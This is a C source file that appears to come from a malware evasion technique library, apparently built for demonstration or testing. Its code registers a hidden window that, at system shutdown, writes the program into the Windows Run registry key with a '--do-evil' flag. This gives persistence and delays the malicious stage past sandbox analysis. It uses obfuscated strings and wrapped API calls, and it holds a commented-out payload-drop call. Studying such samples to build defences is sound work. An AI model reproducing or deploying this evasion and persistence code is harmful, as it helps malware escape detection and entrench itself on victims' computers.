#include "xEvade02.h"

#include <stdint.h>
#include <wchar.h>
#include <Windows.h>

#include "xLibMaliciousApi.h"
#include "xOsApi.h"
#include "xPayload.h"

#include "xPayload.h"



// Name
#define X_APP_NAME L"Evasion02"

// Evil command
#define X_DO_EVIL_CMD L"--do-evil"

// Malware file name
#define X_MALWARE_FILE_NAME X_OBFUSCATED_STRING_W(L"sandworm-payload.file")

// Thread startup sync
static CRITICAL_SECTION g_sync;

// Continue evasion loop if no evasion required
static bool g_doingEvil = false;



LRESULT CALLBACK WndProc(HWND wnd, UINT msg, WPARAM w, LPARAM l)
{
	switch (msg)
	{
		case WM_CLOSE:
		{
			X_USER32_CALL(DestroyWindow)(wnd);

			break;
		}
		case WM_DESTROY:
		{
			X_USER32_CALL(PostQuitMessage)(0);

			break;
		}
		case WM_ENDSESSION:
		{
			wchar_t fileName[MAX_PATH] = {0};

			if (X_KERNEL32_CALL(GetModuleFileNameW)(NULL, fileName, sizeof(fileName) / sizeof(wchar_t)))
			{
				wchar_t* startup = X_LIB_MALICIOUS_CALL(xStringAppend)(fileName, X_OBFUSCATED_STRING_W(L" " X_DO_EVIL_CMD));

				if (startup)
				{
					HKEY key = NULL;

					if (X_ADVAPI32_CALL(RegOpenKeyExW)(HKEY_CURRENT_USER, X_OBFUSCATED_STRING_W(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &key) == ERROR_SUCCESS)
					{
						X_ADVAPI32_CALL(RegSetValueExW)(key, X_OBFUSCATED_STRING_W(X_APP_NAME), 0, REG_SZ, (const uint8_t*) startup, (DWORD) (wcslen(startup) * sizeof(wchar_t) + sizeof(wchar_t)));

						X_ADVAPI32_CALL(RegCloseKey)(key);
					}

					X_LIB_MALICIOUS_CALL(xMemoryFree)(startup);
				}
			}

			break;
		}
		default:
		{
			return X_USER32_CALL(DefWindowProcW)(wnd, msg, w, l);
		}
	}

	return 0;
}

void xEvade02(int argc, wchar_t* argv[])
{
	if (argc == 2)
	{
		if (wcscmp(argv[1], X_OBFUSCATED_STRING_W(X_DO_EVIL_CMD)) == 0)
		{
			//xPayloadDrop("key", s_payload, sizeof(s_payload), X_MALWARE_FILE_NAME);
		}
	}

	WNDCLASSEX wc = {0};

	X_LIB_MALICIOUS_CALL(xMemoryZero)(&wc, sizeof(WNDCLASSEX));

	wc.cbSize = sizeof(WNDCLASSEX);

	wc.lpfnWndProc = WndProc;

	wc.hInstance = X_KERNEL32_CALL(GetModuleHandleW)(NULL);

	wc.lpszClassName = X_APP_NAME L"-{666dc0de-4c90-47aa-b2dd-9c6604099bcc}";

	if (!RegisterClassExW(&wc))
	{
		return;
	}

	HWND wwnd = X_USER32_CALL(CreateWindowExW)(WS_OVERLAPPEDWINDOW, wc.lpszClassName, wc.lpszClassName, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 0, 0, NULL, NULL, wc.hInstance, NULL);

	MSG msg;

	while (X_USER32_CALL(GetMessageW)(&msg, NULL, 0, 0) > 0)
	{
		X_USER32_CALL(TranslateMessage)(&msg);

		X_USER32_CALL(DispatchMessageW)(&msg);
	}
}
